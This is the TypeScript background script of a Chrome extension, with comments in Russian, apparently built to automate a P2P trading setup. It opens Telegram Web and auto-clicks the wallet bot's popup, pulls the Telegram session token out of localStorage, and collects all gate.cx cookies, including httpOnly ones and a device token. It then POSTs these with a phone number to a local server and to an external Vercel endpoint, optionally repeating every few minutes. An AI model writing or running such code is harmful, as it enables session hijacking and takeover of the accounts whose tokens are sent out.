import { Storage } from "@plasmohq/storage"

const storage = new Storage()
let updateInterval: NodeJS.Timeout | null = null

async function getGateCookies() {
  try {
    const cookies = await chrome.cookies.getAll({ domain: "gate.cx" })
    // Возвращаем полный массив куки со всеми параметрами
    return cookies.map(cookie => ({
      name: cookie.name,
      value: cookie.value,
      domain: cookie.domain,
      path: cookie.path,
      secure: cookie.secure,
      httpOnly: cookie.httpOnly,
      sameSite: cookie.sameSite,
      expirationDate: cookie.expirationDate
    }))
  } catch (error) {
    console.error("Ошибка при получении куки:", error)
    return []
  }
}

async function getDeviceToken() {
  try {
    const cookies = await chrome.cookies.getAll({ domain: "gate.cx" })
    const deviceCookie = cookies.find(cookie => cookie.name === "deviceToken")
    if (deviceCookie) {
      return {
        name: deviceCookie.name,
        value: deviceCookie.value,
        domain: deviceCookie.domain,
        path: deviceCookie.path,
        secure: deviceCookie.secure,
        httpOnly: deviceCookie.httpOnly,
        sameSite: deviceCookie.sameSite,
        expirationDate: deviceCookie.expirationDate
      }
    }
    return null
  } catch (error) {
    console.error("Ошибка при получении device token:", error)
    return null
  }
}

async function extractTelegramToken(tabId: number): Promise<string | null> {
  try {
    const result = await chrome.scripting.executeScript({
      target: { tabId },
      func: () => {
        // Ищем токен в localStorage
        const token = localStorage.getItem("tt-global-state")
        if (token) {
          try {
            const parsed = JSON.parse(token)
            return parsed.auth?.user?.token
          } catch (e) {
            console.error("Ошибка парсинга токена:", e)
          }
        }
        return null
      }
    })
    
    return result[0].result
  } catch (error) {
    console.error("Ошибка при извлечении токена:", error)
    return null
  }
}

async function updateAndSendTokens() {
  try {
    const telegramToken = await storage.get("telegramToken")
    const gateCookies = await getGateCookies()
    const deviceToken = await getDeviceToken()
    const customDeviceToken = await storage.get("customDeviceToken")

    // Отправляем данные на серверы
    const data = {
      telegramToken,
      gateCookies,
      deviceToken: customDeviceToken || (deviceToken ? deviceToken.value : null),
      phoneNumber: await storage.get("phoneNumber"),
      idexId: await storage.get("idexId")
    }

    // Отправка на localhost
    await fetch('http://localhost:3000/api/update', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    })

    // Отправка на p2p vercel
    await fetch('https://p2p-vercel.vercel.app/api/update', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    })

    return true
  } catch (error) {
    console.error("Ошибка при обновлении токенов:", error)
    return false
  }
}

async function updateAllTokens() {
  try {
    // Открываем Telegram для обновления токена
    const walletUrl = `https://web.telegram.org/k/#?tgaddr=tg%3A%2F%2Fresolve%3Fdomain%3Dwallet%26attach%3Dwallet`
    
    chrome.tabs.create({ url: walletUrl }, async (walletTab) => {
      // Ждем загрузки страницы Telegram
      chrome.tabs.onUpdated.addListener(function walletListener(tabId, info) {
        if (tabId === walletTab.id && info.status === 'complete') {
          chrome.tabs.onUpdated.removeListener(walletListener)
          
          // Выполняем скрипт для клика по кнопке
          chrome.scripting.executeScript({
            target: { tabId: walletTab.id },
            func: () => {
              const popupButtonObserver = new MutationObserver((mutations, observer) => {
                const popupButton = document.querySelector(".popup-button") as HTMLElement
                if (popupButton) {
                  popupButton.click()
                  observer.disconnect()
                }
              })

              popupButtonObserver.observe(document.body, {
                childList: true,
                subtree: true
              })
            }
          })

          // Ждем 5 секунд и пытаемся получить токен
          setTimeout(async () => {
            const telegramToken = await extractTelegramToken(walletTab.id)
            
            if (telegramToken) {
              await storage.set("telegramToken", telegramToken)
              chrome.tabs.remove(walletTab.id)

              // После получения токена Telegram, открываем Gate.cx
              chrome.tabs.create({ url: "https://panel.gate.cx/" }, async (gateTab) => {
                // Ждем загрузки страницы Gate.cx
                chrome.tabs.onUpdated.addListener(function gateListener(gateTabId, info) {
                  if (gateTabId === gateTab.id && info.status === 'complete') {
                    chrome.tabs.onUpdated.removeListener(gateListener)
                    
                    // Даем время для загрузки всех куки
                    setTimeout(async () => {
                      // Обновляем и отправляем все токены
                      await updateAndSendTokens()
                      // Закрываем вкладку Gate.cx
                      chrome.tabs.remove(gateTab.id)
                    }, 3000)
                  }
                })
              })
            } else {
              chrome.tabs.remove(walletTab.id)
              console.error("Не удалось получить токен Telegram при автоматическом обновлении")
            }
          }, 5000)
        }
      })
    })

    return true
  } catch (error) {
    console.error("Ошибка при обновлении всех токенов:", error)
    return false
  }
}

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.action === "initiateWalletProcess") {
    // Открываем вкладку с кошельком
    const walletUrl = `https://web.telegram.org/k/#?tgaddr=tg%3A%2F%2Fresolve%3Fdomain%3Dwallet%26attach%3Dwallet`
    
    chrome.tabs.create({ url: walletUrl }, async (tab) => {
      // Ждем загрузки страницы
      chrome.tabs.onUpdated.addListener(function listener(tabId, info) {
        if (tabId === tab.id && info.status === 'complete') {
          chrome.tabs.onUpdated.removeListener(listener)
          
          // Выполняем скрипт для клика по кнопке
          chrome.scripting.executeScript({
            target: { tabId: tab.id },
            func: () => {
              const popupButtonObserver = new MutationObserver((mutations, observer) => {
                const popupButton = document.querySelector(".popup-button") as HTMLElement
                if (popupButton) {
                  popupButton.click()
                  observer.disconnect()
                }
              })

              popupButtonObserver.observe(document.body, {
                childList: true,
                subtree: true
              })
            }
          })

          // Ждем 5 секунд и пытаемся получить токен
          setTimeout(async () => {
            const telegramToken = await extractTelegramToken(tab.id)
            
            if (telegramToken) {
              await storage.set("telegramToken", telegramToken)
              chrome.tabs.remove(tab.id)

              // Открываем Gate.cx для обновления куки
              chrome.tabs.create({ url: "https://panel.gate.cx/" }, async (gateTab) => {
                // Ждем загрузки страницы Gate.cx
                chrome.tabs.onUpdated.addListener(function gateListener(gateTabId, info) {
                  if (gateTabId === gateTab.id && info.status === 'complete') {
                    chrome.tabs.onUpdated.removeListener(gateListener)
                    
                    // Даем время для загрузки всех куки
                    setTimeout(async () => {
                      const gateCookies = await getGateCookies()
                      const deviceToken = await getDeviceToken()
                      
                      // Закрываем вкладку Gate.cx
                      chrome.tabs.remove(gateTab.id)
                      
                      // Отправляем данные
                      await updateAndSendTokens()
                      
                      sendResponse({ 
                        success: true, 
                        telegramToken,
                        telegramPreview: telegramToken.substring(0, 15) + "...",
                        gateCookies,
                        gateCookiesPreview: gateCookies.length > 0 ? `${gateCookies.length} cookies` : "Не найдены",
                        deviceToken,
                        deviceTokenPreview: deviceToken ? (deviceToken.value.substring(0, 15) + "...") : "Не найден"
                      })
                    }, 3000)
                  }
                })
              })
            } else {
              chrome.tabs.remove(tab.id)
              sendResponse({ 
                success: false, 
                error: "Не удалось получить токен" 
              })
            }
          }, 5000)
        }
      })
    })
    return true
  } else if (message.action === "getTokens") {
    Promise.all([
      storage.get("telegramToken"),
      getGateCookies(),
      getDeviceToken(),
      storage.get("customDeviceToken")
    ]).then(([telegramToken, gateCookies, deviceToken, customDeviceToken]) => {
      sendResponse({
        telegramToken,
        telegramPreview: telegramToken ? (telegramToken.substring(0, 15) + "...") : "",
        gateCookies,
        gateCookiesPreview: gateCookies.length > 0 ? `${gateCookies.length} cookies` : "Не найдены",
        deviceToken: customDeviceToken ? { value: customDeviceToken } : deviceToken,
        deviceTokenPreview: customDeviceToken || (deviceToken ? deviceToken.value : "")
      })
    })
    return true
  } else if (message.action === "startPeriodicUpdates") {
    const minutes = message.minutes || 15
    
    // Очищаем предыдущий интервал если он существует
    if (updateInterval) {
      clearInterval(updateInterval)
    }
    
    // Устанавливаем новый интервал
    updateInterval = setInterval(async () => {
      // Обновляем все токены
      await updateAllTokens()
    }, minutes * 60 * 1000) // Конвертируем минуты в миллисекунды
    
    sendResponse({ success: true })
    return true
  } else if (message.action === "stopPeriodicUpdates") {
    if (updateInterval) {
      clearInterval(updateInterval)
      updateInterval = null
    }
    sendResponse({ success: true })
    return true
  }
})
